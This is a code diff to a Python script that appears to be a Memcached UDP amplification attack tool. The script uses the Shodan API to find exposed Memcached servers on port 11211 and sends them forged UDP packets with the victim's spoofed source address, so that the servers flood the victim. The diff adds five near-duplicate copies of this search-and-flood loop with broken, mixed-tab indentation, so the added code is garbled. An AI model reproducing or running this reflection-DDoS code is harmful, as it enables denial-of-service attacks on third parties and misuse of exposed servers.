@@ -28,16 +28,6 @@ while True:
         query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
         if query.startswith('y'):
             print('')
-            
-            # Search Shodan
-            results = api.search('apache')
-            # Show the results
-            print ('Results found: %s' % results['total'])
-            for result in results['matches']:
-                print('IP: %s' % result['ip_str'])
-                print(result['data'])
-                print('')
-           
             print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
             results = api.search('product:"Memcached" port:11211 -has_ipv6:true')
             print('[✓] API Key Authentication: SUCCESS')
@@ -111,7 +101,95 @@ while True:
                             print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                             with suppress_stdout():
                                 send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-                print('')
+                print('100')
+
+                results = api.search('-has_ipv6:true product:"Memcached" port:11211')
+		            print('[✓] API Key Authentication: SUCCESS')
+		            print('[~] Number of bots: %s' % results['total'])
+		            print('')
+		            print(results['matches'])
+		            print('')
+		            for result in results['matches']:
+		                if power>1:
+		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		                elif power==1:
+		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		            print('200')
+
+		        results = api.search('-has_ipv6:true port:11211 product:"Memcached"')
+		            print('[✓] API Key Authentication: SUCCESS')
+		            print('[~] Number of bots: %s' % results['total'])
+		            print('')
+		            print(results['matches'])
+		            print('')
+		            for result in results['matches']:
+		                if power>1:
+		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		                elif power==1:
+		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		            print('300')
+
+		        results = api.search('product:"Memcached" -has_ipv6:true port:11211')
+		            print('[✓] API Key Authentication: SUCCESS')
+		            print('[~] Number of bots: %s' % results['total'])
+		            print('')
+		            print(results['matches'])
+		            print('')
+		            for result in results['matches']:
+		                if power>1:
+		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		                elif power==1:
+		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		            print('400')
+
+		        results = api.search('port:11211 -has_ipv6:true port:11211 product:"Memcached"')
+		            print('[✓] API Key Authentication: SUCCESS')
+		            print('[~] Number of bots: %s' % results['total'])
+		            print('')
+		            print(results['matches'])
+		            print('')
+		            for result in results['matches']:
+		                if power>1:
+		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		                elif power==1:
+		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		            print('500')
+
+		        results = api.search('port:11211 product:"Memcached" -has_ipv6:true')
+		            print('[✓] API Key Authentication: SUCCESS')
+		            print('[~] Number of bots: %s' % results['total'])
+		            print('')
+		            print(results['matches'])
+		            print('')
+		            for result in results['matches']:
+		                if power>1:
+		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		                elif power==1:
+		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+		                    with suppress_stdout():
+		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+		            print('600')
+
+
+
                 print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                 break
             else:
